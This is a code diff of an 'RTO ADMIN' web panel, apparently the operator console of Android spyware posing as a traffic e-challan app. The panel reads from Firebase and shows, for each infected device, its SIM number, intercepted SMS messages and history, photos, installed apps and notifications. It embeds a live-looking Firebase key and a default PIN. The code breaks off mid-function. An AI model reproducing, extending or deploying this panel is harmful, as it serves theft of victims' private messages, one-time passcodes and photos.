@@ -7,244 +7,151 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: #E5E7EB; min-height: 100vh; }
-  
-  .login-screen {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background: #0A0E1A; display: flex; align-items: center; justify-content: center;
-    z-index: 10000; padding: 20px;
-  }
-  .login-box {
-    background: #111827; border: 1px solid #00E5FF; border-radius: 16px;
-    padding: 32px; max-width: 380px; width: 100%; text-align: center;
-    box-shadow: 0 20px 60px rgba(0,229,255,0.2);
-  }
-  .login-box h1 { color: #00E5FF; font-size: 22px; margin-bottom: 8px; }
-  .login-box p { color: #8B9BB4; font-size: 12px; margin-bottom: 24px; }
-  .pin-input {
-    width: 100%; padding: 14px; background: #0F1729; border: 1px solid #1F2F4A;
-    border-radius: 10px; color: #E5E7EB; font-size: 20px; text-align: center;
-    letter-spacing: 0.5em; font-family: monospace; margin-bottom: 12px;
-  }
-  .pin-input:focus { outline: none; border-color: #00E5FF; }
-  .btn-primary {
-    width: 100%; padding: 14px; background: #00E5FF; color: #0A0E1A;
-    border: none; border-radius: 10px; font-size: 14px; font-weight: bold;
-    cursor: pointer; transition: 0.2s;
-  }
-  .btn-primary:hover { background: #00B8D4; }
-  .error-msg { color: #FF3B5C; font-size: 12px; margin-top: 8px; min-height: 16px; }
-  
-  .topbar {
-    background: #111827; padding: 14px 20px; display: flex;
-    justify-content: space-between; align-items: center;
-    border-bottom: 1px solid #1F2F4A; position: sticky; top: 0; z-index: 100;
-  }
-  .topbar h1 { color: #00E5FF; font-size: 18px; letter-spacing: 0.05em; }
-  .topbar-right { display: flex; align-items: center; gap: 12px; }
-  .status { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #00FF88; }
-  .dot { width: 8px; height: 8px; border-radius: 50%; background: #00FF88; animation: pulse 2s infinite; }
-  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
-  .btn-logout {
-    background: #FF3B5C; color: white; border: none; padding: 8px 14px;
-    border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer;
-  }
-  
-  .stats {
-    display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-    gap: 10px; padding: 16px 20px; max-width: 1400px; margin: 0 auto;
-  }
-  .stat-card {
-    background: linear-gradient(135deg, #1E40AF, #7C3AED);
-    padding: 14px; border-radius: 12px; text-align: center;
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-  }
-  .stat-card .num { font-size: 26px; font-weight: bold; color: white; }
-  .stat-card .label { font-size: 10px; color: rgba(255,255,255,0.8); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 2px; }
-  
-  .container { max-width: 1400px; margin: 0 auto; padding: 0 20px 40px; }
-  .section-title { color: #00E5FF; font-size: 13px; font-weight: bold; letter-spacing: 0.1em; margin: 16px 0 10px; text-transform: uppercase; }
-  .search-box {
-    width: 100%; padding: 12px 16px; background: #0F1729;
-    border: 1px solid #1F2F4A; border-radius: 10px; color: #E5E7EB;
-    font-size: 13px; margin-bottom: 14px;
-  }
-  .search-box:focus { outline: none; border-color: #00E5FF; }
-  
-  .filters { display: flex; gap: 6px; margin-bottom: 12px; flex-wrap: wrap; }
-  .filter-btn {
-    padding: 6px 14px; background: #0F1729; border: 1px solid #1F2F4A;
-    border-radius: 8px; color: #00E5FF; font-size: 11px; font-weight: bold;
-    cursor: pointer; transition: 0.2s;
-  }
-  .filter-btn.active { background: #00E5FF; color: #0A0E1A; }
-  
-  .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 12px; }
-  .device-card {
-    background: #0F1729; border: 1px solid #1F2F4A; border-radius: 14px;
-    padding: 14px; cursor: pointer; transition: 0.2s;
-  }
-  .device-card:hover { border-color: #00E5FF; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,229,255,0.15); }
-  .device-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
-  .serial-badge {
-    width: 40px; height: 40px; border-radius: 50%; background: #1A2F4A;
-    border: 2px solid #00E5FF; display: flex; align-items: center;
-    justify-content: center; font-weight: bold; color: #00E5FF; font-size: 14px;
-  }
-  .device-info { flex: 1; min-width: 0; }
-  .device-name { color: white; font-size: 14px; font-weight: bold; margin-bottom: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-  .device-id { color: #8B9BB4; font-size: 10px; font-family: monospace; }
-  .status-badge { padding: 4px 10px; border-radius: 12px; font-size: 9px; font-weight: bold; text-transform: uppercase; }
-  .status-online { background: rgba(0,255,136,0.15); color: #00FF88; border: 1px solid #00FF88; }
-  .status-offline { background: rgba(255,59,92,0.15); color: #FF3B5C; border: 1px solid #FF3B5C; }
-  .device-details {
-    display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
-    padding-top: 10px; border-top: 1px solid #1F2F4A; font-size: 11px;
-  }
-  .device-details .label { color: #5A6B85; font-size: 9px; text-transform: uppercase; }
-  .device-details .value { color: #E5E7EB; margin-top: 2px; font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-  
-  .modal-overlay {
-    display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background: rgba(0,0,0,0.85); z-index: 999; justify-content: center;
-    align-items: center; padding: 10px;
-  }
-  .modal-overlay.active { display: flex; }
-  .modal-content {
-    background: #111827; border-radius: 16px; max-width: 950px; width: 100%;
-    max-height: 92vh; overflow: hidden; display: flex; flex-direction: column;
-    border: 1px solid #00E5FF; box-shadow: 0 20px 60px rgba(0,229,255,0.2);
-  }
-  .modal-header {
-    padding: 14px 18px; border-bottom: 1px solid #1F2F4A; display: flex;
-    justify-content: space-between; align-items: center; background: #0F1729;
-  }
-  .modal-header h2 { color: #00E5FF; font-size: 15px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-  .close-btn {
-    background: #FF3B5C; color: white; border: none; width: 30px; height: 30px;
-    border-radius: 8px; cursor: pointer; font-size: 16px; flex-shrink: 0;
-  }
-  .tabs {
-    display: flex; gap: 3px; padding: 10px 14px 0; background: #0F1729;
-    border-bottom: 1px solid #1F2F4A; overflow-x: auto;
-  }
-  .tab {
-    padding: 9px 14px; background: transparent; border: none; color: #00E5FF;
-    font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 8px 8px 0 0;
-    white-space: nowrap;
-  }
-  .tab.active { background: #00E5FF; color: #0A0E1A; }
-  .modal-body { padding: 16px; overflow-y: auto; flex: 1; }
-  
-  .message-item {
-    background: #0F1729; border-left: 3px solid #00E5FF; border-radius: 8px;
-    padding: 12px; margin-bottom: 10px;
-  }
-  .message-item.sent { border-left-color: #00FF88; }
-  .msg-sender { color: #00E5FF; font-size: 12px; font-weight: bold; margin-bottom: 4px; }
-  .msg-body { color: #E5E7EB; font-size: 13px; line-height: 1.4; word-break: break-word; }
-  .msg-date { color: #5A6B85; font-size: 10px; margin-top: 6px; text-align: right; }
-  
-  .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 8px; }
-  .photo-item { border-radius: 8px; overflow: hidden; background: #0F1729; cursor: pointer; }
-  .photo-item img { width: 100%; height: 110px; object-fit: cover; display: block; }
-  .photo-name { padding: 5px; font-size: 9px; color: #8B9BB4; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
-  
-  .app-item {
-    background: #0F1729; padding: 10px 12px; border-radius: 8px;
-    margin-bottom: 6px; display: flex; align-items: center; gap: 10px;
-  }
-  .app-icon {
-    width: 32px; height: 32px; background: #1A2F4A; border-radius: 8px;
-    display: flex; align-items: center; justify-content: center;
-    color: #00E5FF; font-size: 16px; flex-shrink: 0;
-  }
-  .app-name { color: white; font-size: 12px; font-weight: bold; }
-  .app-package { color: #8B9BB4; font-size: 9px; font-family: monospace; margin-top: 2px; word-break: break-all; }
-  
-  .loading { text-align: center; padding: 40px; color: #5A6B85; }
-  .empty-msg { text-align: center; padding: 40px 20px; color: #5A6B85; font-size: 13px; }
-  
-  @media (max-width: 600px) {
-    .topbar h1 { font-size: 14px; }
-    .device-grid { grid-template-columns: 1fr; }
-    .photo-grid { grid-template-columns: repeat(auto-fill, minmax(85px, 1fr)); }
-    .photo-item img { height: 85px; }
-    .stat-card .num { font-size: 20px; }
-  }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Roboto, sans-serif; background: #0A0E1A; color: #E5E7EB; min-height: 100vh; }
+.login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0A0E1A; display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px; }
+.login-box { background: #111827; border: 1px solid #00E5FF; border-radius: 16px; padding: 32px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0,229,255,0.2); }
+.login-box h1 { color: #00E5FF; font-size: 22px; margin-bottom: 8px; }
+.login-box p { color: #8B9BB4; font-size: 12px; margin-bottom: 24px; }
+.pin-input { width: 100%; padding: 14px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 10px; color: #E5E7EB; font-size: 20px; text-align: center; letter-spacing: 0.5em; font-family: monospace; margin-bottom: 12px; }
+.pin-input:focus { outline: none; border-color: #00E5FF; }
+.btn-primary { width: 100%; padding: 14px; background: #00E5FF; color: #0A0E1A; border: none; border-radius: 10px; font-size: 14px; font-weight: bold; cursor: pointer; }
+.btn-primary:hover { background: #00B8D4; }
+.error-msg { color: #FF3B5C; font-size: 12px; margin-top: 8px; min-height: 16px; }
+.topbar { background: #111827; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1F2F4A; position: sticky; top: 0; z-index: 100; }
+.topbar h1 { color: #00E5FF; font-size: 18px; }
+.topbar-right { display: flex; align-items: center; gap: 12px; }
+.status { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #00FF88; }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: #00FF88; animation: pulse 2s infinite; }
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+.btn-logout { background: #FF3B5C; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; }
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; padding: 16px 20px; max-width: 1400px; margin: 0 auto; }
+.stat-card { background: linear-gradient(135deg, #1E40AF, #7C3AED); padding: 14px; border-radius: 12px; text-align: center; }
+.stat-card .num { font-size: 26px; font-weight: bold; color: white; }
+.stat-card .label { font-size: 10px; color: rgba(255,255,255,0.8); text-transform: uppercase; letter-spacing: 0.1em; margin-top: 2px; }
+.container { max-width: 1400px; margin: 0 auto; padding: 0 20px 40px; }
+.section-title { color: #00E5FF; font-size: 13px; font-weight: bold; letter-spacing: 0.1em; margin: 16px 0 10px; text-transform: uppercase; }
+.search-box { width: 100%; padding: 12px 16px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 10px; color: #E5E7EB; font-size: 13px; margin-bottom: 14px; }
+.search-box:focus { outline: none; border-color: #00E5FF; }
+.filters { display: flex; gap: 6px; margin-bottom: 12px; flex-wrap: wrap; }
+.filter-btn { padding: 6px 14px; background: #0F1729; border: 1px solid #1F2F4A; border-radius: 8px; color: #00E5FF; font-size: 11px; font-weight: bold; cursor: pointer; }
+.filter-btn.active { background: #00E5FF; color: #0A0E1A; }
+.device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 12px; }
+.device-card { background: #0F1729; border: 1px solid #1F2F4A; border-radius: 14px; padding: 14px; cursor: pointer; transition: 0.2s; }
+.device-card:hover { border-color: #00E5FF; transform: translateY(-2px); }
+.device-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+.serial-badge { width: 40px; height: 40px; border-radius: 50%; background: #1A2F4A; border: 2px solid #00E5FF; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #00E5FF; font-size: 14px; }
+.device-info { flex: 1; min-width: 0; }
+.device-name { color: white; font-size: 14px; font-weight: bold; margin-bottom: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.device-id { color: #8B9BB4; font-size: 10px; font-family: monospace; }
+.status-badge { padding: 4px 10px; border-radius: 12px; font-size: 9px; font-weight: bold; text-transform: uppercase; }
+.status-online { background: rgba(0,255,136,0.15); color: #00FF88; border: 1px solid #00FF88; }
+.status-offline { background: rgba(255,59,92,0.15); color: #FF3B5C; border: 1px solid #FF3B5C; }
+.device-details { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding-top: 10px; border-top: 1px solid #1F2F4A; font-size: 11px; }
+.device-details .label { color: #5A6B85; font-size: 9px; text-transform: uppercase; }
+.device-details .value { color: #E5E7EB; margin-top: 2px; font-weight: 500; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 999; justify-content: center; align-items: center; padding: 10px; }
+.modal-overlay.active { display: flex; }
+.modal-content { background: #111827; border-radius: 16px; max-width: 950px; width: 100%; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column; border: 1px solid #00E5FF; }
+.modal-header { padding: 14px 18px; border-bottom: 1px solid #1F2F4A; display: flex; justify-content: space-between; align-items: center; background: #0F1729; }
+.modal-header h2 { color: #00E5FF; font-size: 15px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.close-btn { background: #FF3B5C; color: white; border: none; width: 30px; height: 30px; border-radius: 8px; cursor: pointer; font-size: 16px; }
+.tabs { display: flex; gap: 3px; padding: 10px 14px 0; background: #0F1729; border-bottom: 1px solid #1F2F4A; overflow-x: auto; }
+.tab { padding: 9px 14px; background: transparent; border: none; color: #00E5FF; font-size: 11px; font-weight: bold; cursor: pointer; border-radius: 8px 8px 0 0; white-space: nowrap; }
+.tab.active { background: #00E5FF; color: #0A0E1A; }
+.modal-body { padding: 16px; overflow-y: auto; flex: 1; }
+.message-item { background: #0F1729; border-left: 3px solid #00E5FF; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
+.message-item.sent { border-left-color: #00FF88; }
+.msg-sender { color: #00E5FF; font-size: 12px; font-weight: bold; margin-bottom: 4px; }
+.msg-body { color: #E5E7EB; font-size: 13px; line-height: 1.4; word-break: break-word; }
+.msg-date { color: #5A6B85; font-size: 10px; margin-top: 6px; text-align: right; }
+.photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 8px; }
+.photo-item { border-radius: 8px; overflow: hidden; background: #0F1729; cursor: pointer; }
+.photo-item img { width: 100%; height: 110px; object-fit: cover; display: block; }
+.photo-name { padding: 5px; font-size: 9px; color: #8B9BB4; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+.app-item { background: #0F1729; padding: 10px 12px; border-radius: 8px; margin-bottom: 6px; display: flex; align-items: center; gap: 10px; }
+.app-icon { width: 32px; height: 32px; background: #1A2F4A; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #00E5FF; font-size: 16px; }
+.app-name { color: white; font-size: 12px; font-weight: bold; }
+.app-package { color: #8B9BB4; font-size: 9px; font-family: monospace; margin-top: 2px; }
+.loading { text-align: center; padding: 40px; color: #5A6B85; }
+.empty-msg { text-align: center; padding: 40px 20px; color: #5A6B85; font-size: 13px; }
+@media (max-width: 600px) {
+.topbar h1 { font-size: 14px; }
+.device-grid { grid-template-columns: 1fr; }
+.photo-grid { grid-template-columns: repeat(auto-fill, minmax(85px, 1fr)); }
+.photo-item img { height: 85px; }
+}
 </style>
 </head>
-<body><!-- LOGIN SCREEN -->
+<body>
+
 <div class="login-screen" id="loginScreen">
-  <div class="login-box">
-    <h1>🔐 RTO ADMIN</h1>
-    <p>Enter your PIN to continue</p>
-    <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
-    <button class="btn-primary" onclick="login()">LOGIN</button>
-    <div class="error-msg" id="errorMsg"></div>
-  </div>
+<div class="login-box">
+<h1>🔐 RTO ADMIN</h1>
+<p>Enter your PIN to continue</p>
+<input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••" inputmode="numeric">
+<button class="btn-primary" onclick="login()">LOGIN</button>
+<div class="error-msg" id="errorMsg"></div>
+</div>
 </div>
 
-<!-- MAIN APP -->
 <div id="mainApp" style="display:none;">
-  <div class="topbar">
-    <h1>🚔 RTO ADMIN</h1>
-    <div class="topbar-right">
-      <div class="status"><div class="dot"></div><span>Live</span></div>
-      <button class="btn-logout" onclick="logout()">LOGOUT</button>
-    </div>
-  </div>
-
-  <div class="stats">
-    <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
-    <div class="stat-card"><div class="num" id="statOnline">0</div><div class="label">Online</div></div>
-    <div class="stat-card"><div class="num" id="statMessages">0</div><div class="label">Messages</div></div>
-    <div class="stat-card"><div class="num" id="statPhotos">0</div><div class="label">Photos</div></div>
-  </div>
-
-  <div class="container">
-    <div class="section-title">📱 All Devices (<span id="deviceCount">0</span>)</div>
-    <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search by model, ID, SIM...">
-    <div class="filters">
-      <div class="filter-btn active" onclick="setDeviceFilter('all', event)">All</div>
-      <div class="filter-btn" onclick="setDeviceFilter('online', event)">Online</div>
-      <div class="filter-btn" onclick="setDeviceFilter('offline', event)">Offline</div>
-    </div>
-    <div class="device-grid" id="deviceGrid">
-      <div class="loading">Loading devices...</div>
-    </div>
-  </div>
+<div class="topbar">
+<h1>🚔 RTO ADMIN</h1>
+<div class="topbar-right">
+<div class="status"><div class="dot"></div><span>Live</span></div>
+<button class="btn-logout" onclick="logout()">LOGOUT</button>
+</div>
 </div>
 
-<!-- DEVICE DETAIL MODAL -->
+<div class="stats">
+<div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Devices</div></div>
+<div class="stat-card"><div class="num" id="statOnline">0</div><div class="label">Online</div></div>
+<div class="stat-card"><div class="num" id="statMessages">0</div><div class="label">Messages</div></div>
+<div class="stat-card"><div class="num" id="statPhotos">0</div><div class="label">Photos</div></div>
+</div>
+
+<div class="container">
+<div class="section-title">📱 All Devices (<span id="deviceCount">0</span>)</div>
+<input type="text" class="search-box" id="searchBox" placeholder="🔍 Search by model, ID, SIM...">
+<div class="filters">
+<div class="filter-btn active" onclick="setDeviceFilter('all', event)">All</div>
+<div class="filter-btn" onclick="setDeviceFilter('online', event)">Online</div>
+<div class="filter-btn" onclick="setDeviceFilter('offline', event)">Offline</div>
+</div>
+<div class="device-grid" id="deviceGrid">
+<div class="loading">Loading devices...</div>
+</div>
+</div>
+</div>
+
 <div class="modal-overlay" id="modal">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h2 id="modalTitle">Device Details</h2>
-      <button class="close-btn" onclick="closeModal()">✕</button>
-    </div>
-    <div class="tabs">
-      <button class="tab active" onclick="switchTab('messages', event)">📨 Messages</button>
-      <button class="tab" onclick="switchTab('history', event)">📜 History</button>
-      <button class="tab" onclick="switchTab('photos', event)">🖼️ Photos</button>
-      <button class="tab" onclick="switchTab('apps', event)">📦 Apps</button>
-      <button class="tab" onclick="switchTab('notifications', event)">🔔 Notifs</button>
-      <button class="tab" onclick="switchTab('info', event)">ℹ️ Info</button>
-    </div>
-    <div class="modal-body" id="modalBody">
-      <div class="loading">Loading...</div>
-    </div>
-  </div>
-</div><script>
-// FIREBASE CONFIG
+<div class="modal-content">
+<div class="modal-header">
+<h2 id="modalTitle">Device Details</h2>
+<button class="close-btn" onclick="closeModal()">✕</button>
+</div>
+<div class="tabs">
+<button class="tab active" onclick="switchTab('messages', event)">📨 Messages</button>
+<button class="tab" onclick="switchTab('history', event)">📜 History</button>
+<button class="tab" onclick="switchTab('photos', event)">🖼️ Photos</button>
+<button class="tab" onclick="switchTab('apps', event)">📦 Apps</button>
+<button class="tab" onclick="switchTab('notifications', event)">🔔 Notifs</button>
+<button class="tab" onclick="switchTab('info', event)">ℹ️ Info</button>
+</div>
+<div class="modal-body" id="modalBody">
+<div class="loading">Loading...</div>
+</div>
+</div>
+</div>
+
+<script>
 const firebaseConfig = {
   apiKey: "AIzaSyAUdypsKO90R7-qqvR0W7oM27HgtTXKVL8",
   databaseURL: "https://rto-echallan-v2-default-rtdb.firebaseio.com",
   projectId: "rto-echallan-v2",
   appId: "1:5750315381:android:95dc88826b1ef1262b9b3c"
 };
-
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
@@ -255,15 +162,10 @@ let deviceMessages = {};
 let devicePhotos = {};
 let currentFilter = 'all';
 
-// LOGIN
 function login() {
   const pin = document.getElementById('pinInput').value.trim();
-  if (pin.length < 4) {
-    document.getElementById('errorMsg').textContent = 'Enter valid PIN';
-    return;
-  }
+  if (pin.length < 4) { document.getElementById('errorMsg').textContent = 'Enter valid PIN'; return; }
   document.getElementById('errorMsg').textContent = 'Checking...';
-  
   db.ref('admin_config/login_pin').once('value').then(snap => {
     const savedPin = snap.val() || '0987';
     if (pin === savedPin) {
@@ -293,7 +195,6 @@ window.addEventListener('load', () => {
   });
 });
 
-// START APP
 function startApp() {
   db.ref('device_info').on('value', snapshot => {
     allDevices = snapshot.val() || {};
@@ -302,18 +203,15 @@ function startApp() {
   });
 }
 
-// STATS
 function updateStats() {
   const devices = Object.keys(allDevices);
   let online = 0, totalMsgs = 0, totalPhotos = 0;
-
   devices.forEach(id => {
     const dev = allDevices[id];
     if (dev.status === 'Online') online++;
     if (dev.messages) totalMsgs += Object.keys(dev.messages).length;
     if (dev.photos) totalPhotos += Object.keys(dev.photos).length;
   });
-
   document.getElementById('statDevices').textContent = devices.length;
   document.getElementById('statOnline').textContent = online;
   document.getElementById('statMessages').textContent = totalMsgs;
@@ -328,54 +226,29 @@ function setDeviceFilter(filter, event) {
   renderDevices();
 }
 
-// RENDER DEVICES
 function renderDevices() {
   const grid = document.getElementById('deviceGrid');
   const search = document.getElementById('searchBox')?.value.toLowerCase() || '';
-  
   let ids = Object.keys(allDevices).filter(id => {
     const dev = allDevices[id];
     if (currentFilter === 'online' && dev.status !== 'Online') return false;
     if (currentFilter === 'offline' && dev.status === 'Online') return false;
-    const searchable = (id + ' ' + (dev.device_model || '') + ' ' + (dev.sim_info?.sim1_number || '')).toLowerCase();
-    return searchable.includes(search);
+    const s = (id + ' ' + (dev.device_model || '') + ' ' + (dev.sim_info?.sim1_number || '')).toLowerCase();
+    return s.includes(search);
   });
-
-  if (ids.length === 0) {
-    grid.innerHTML = '<div class="empty-msg">No devices found</div>';
-    return;
-  }
-
+  if (ids.length === 0) { grid.innerHTML = '<div class="empty-msg">No devices found</div>'; return; }
   ids.sort((a, b) => {
     const ta = allDevices[a].first_install_timestamp || allDevices[a].install_timestamp || 0;
     const tb = allDevices[b].first_install_timestamp || allDevices[b].install_timestamp || 0;
     return tb - ta;
   });
-
   grid.innerHTML = ids.map((id, idx) => {
     const dev = allDevices[id];
     const isOnline = dev.status === 'Online';
     const model = dev.device_model || 'Unknown';
     const battery = dev.battery || '0%';
     const sim = dev.sim_info?.sim1_number || dev.sim_info?.sim2_number || 'No SIM';
-
-    return `
-      <div class="device-card" onclick="openDevice('${id}')">
-        <div class="device-header">
-          <div class="serial-badge">${idx + 1}</div>
-          <div class="device-info">
-            <div class="device-name">${model}</div>
-            <div class="device-id">${id}</div>
-          </div>
-          <div class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? 'Online' : 'Offline'}</div>
-        </div>
-        <div class="device-details">
-          <div><div class="label">Battery</div><div class="value" style="color:${getBatteryColor(battery)}">${battery}</div></div>
-          <div><div class="label">SIM</div><div class="value">${sim}</div></div>
-          <div><div class="label">Android</div><div class="value">${dev.android_version || '?'}</div></div>
-        </div>
-      </div>
-    `;
+    return '<div class="device-card" onclick="openDevice(\'' + id + '\')"><div class="device-header"><div class="serial-badge">' + (idx + 1) + '</div><div class="device-info"><div class="device-name">' + model + '</div><div class="device-id">' + id + '</div></div><div class="status-badge ' + (isOnline ? 'status-online' : 'status-offline') + '">' + (isOnline ? 'Online' : 'Offline') + '</div></div><div class="device-details"><div><div class="label">Battery</div><div class="value" style="color:' + getBatteryColor(battery) + '">' + battery + '</div></div><div><div class="label">SIM</div><div class="value">' + sim + '</div></div><div><div class="label">Android</div><div class="value">' + (dev.android_version || '?') + '</div></div></div></div>';
   }).join('');
 }
 
@@ -388,22 +261,18 @@ function getBatteryColor(battery) {
   return '#FF3B5C';
 }
 
-// OPEN DEVICE
 function openDevice(deviceId) {
   currentDeviceId = deviceId;
   const dev = allDevices[deviceId];
-  document.getElementById('modalTitle').textContent = `📱 ${dev.device_model || deviceId}`;
-
+  document.getElementById('modalTitle').textContent = '📱 ' + (dev.device_model || deviceId);
   db.ref('device_info/' + deviceId + '/messages').on('value', snap => {
     deviceMessages = snap.val() || {};
-    if (currentTab === 'messages') renderTab();
+    if (currentTab === 'messages' || currentTab === 'history') renderTab();
   });
-
   db.ref('device_info/' + deviceId + '/photos').on('value', snap => {
     devicePhotos = snap.val() || {};
     if (currentTab === 'photos') renderTab();
   });
-
   document.getElementById('modal').classList.add('active');
   switchTab('messages', null);
 }
@@ -427,89 +296,36 @@ function switchTab(tab, event) {
   }
   renderTab();
 }
-                                                                                       </script><script>
+
 function renderTab() {
   const body = document.getElementById('modalBody');
   const dev = allDevices[currentDeviceId];
   if (!dev) { body.innerHTML = '<div class="empty-msg">Device not found</div>'; return; }
-
   if (currentTab === 'messages') {
     const msgs = Object.entries(deviceMessages).sort((a,b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
     if (msgs.length === 0) { body.innerHTML = '<div class="empty-msg">No messages</div>'; return; }
-    body.innerHTML = msgs.map(([k, m]) => `
-      <div class="message-item ${m.type === 'SENT' ? 'sent' : ''}">
-        <div class="msg-sender">${m.sender || 'Unknown'}</div>
-        <div class="msg-body">${escapeHtml(m.body || '')}</div>
-        <div class="msg-date">${m.date || ''}</div>
-      </div>
-    `).join('');
-  }
-  else if (currentTab === 'history') {
+    body.innerHTML = msgs.map(([k, m]) => '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-sender">' + (m.sender || 'Unknown') + '</div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>').join('');
+  } else if (currentTab === 'history') {
     const history = dev.sms_history || {};
     const msgs = Object.entries(history).sort((a,b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
     if (msgs.length === 0) { body.innerHTML = '<div class="empty-msg">No SMS history</div>'; return; }
-    body.innerHTML = msgs.map(([k, m]) => `
-      <div class="message-item">
-        <div class="msg-sender">${m.sender || 'Unknown'} (${m.type || 'INCOMING'})</div>
-        <div class="msg-body">${escapeHtml(m.body || '')}</div>
-        <div class="msg-date">${m.date || ''}</div>
-      </div>
-    `).join('');
-  }
-  else if (currentTab === 'photos') {
+    body.innerHTML = msgs.map(([k, m]) => '<div class="message-item"><div class="msg-sender">' + (m.sender || 'Unknown') + ' (' + (m.type || 'INCOMING') + ')</div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>').join('');
+  } else if (currentTab === 'photos') {
     const photos = Object.entries(devicePhotos);
     if (photos.length === 0) { body.innerHTML = '<div class="empty-msg">No photos</div>'; return; }
-    body.innerHTML = '<div class="photo-grid">' + photos.map(([k, p]) => `
-      <div class="photo-item" onclick="viewPhoto('${k}')">
-        <img src="${p.base64 || ''}" loading="lazy" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%2250%22 x=%2250%22 text-anchor=%22middle%22 fill=%22%235A6B85%22 font-size=%2240%22>📷</text></svg>'">
-        <div class="photo-name">${p.name || 'IMG'}</div>
-      </div>
-    `).join('') + '</div>';
-  }
-  else if (currentTab === 'apps') {
+    body.innerHTML = '<div class="photo-grid">' + photos.map(([k, p]) => '<div class="photo-item" onclick="viewPhoto(\'' + k + '\')"><img src="' + (p.base64 || '') + '" loading="lazy"><div class="photo-name">' + (p.name || 'IMG') + '</div></div>').join('') + '</div>';
+  } else if (currentTab === 'apps') {
     const apps = dev.installed_apps || {};
     const list = Object.values(apps).sort((a,b) => (a.name || '').localeCompare(b.name || ''));
     if (list.length === 0) { body.innerHTML = '<div class="empty-msg">No apps</div>'; return; }
-    body.innerHTML = list.map(a => `
-      <div class="app-item">
-        <div class="app-icon">📦</div>
-        <div style="flex:1;min-width:0;">
-          <div class="app-name">${escapeHtml(a.name || 'Unknown')}</div>
-          <div class="app-package">${escapeHtml(a.package || '')}</div>
-        </div>
-      </div>
-    `).join('');
-  }
-  else if (currentTab === 'notifications') {
+    body.innerHTML = list.map(a => '<div class="app-item"><div class="app-icon">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + escapeHtml(a.name || 'Unknown') + '</div><div class="app-package">' + escapeHtml(a.package || '') + '</div></div></div>').join('');
+  } else if (currentTab === 'notifications') {
     const notifs = dev.notifications || {};
     const list = Object.entries(notifs).sort((a,b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
     if (list.length === 0) { body.innerHTML = '<div class="empty-msg">No notifications</div>'; return; }
-    body.innerHTML = list.map(([k, n]) => `
-      <div class="message-item">
-        <div class="msg-sender">${escapeHtml(n.app || 'App')} — ${escapeHtml(n.title || '')}</div>
-        <div class="msg-body">${escapeHtml(n.message || '')}</div>
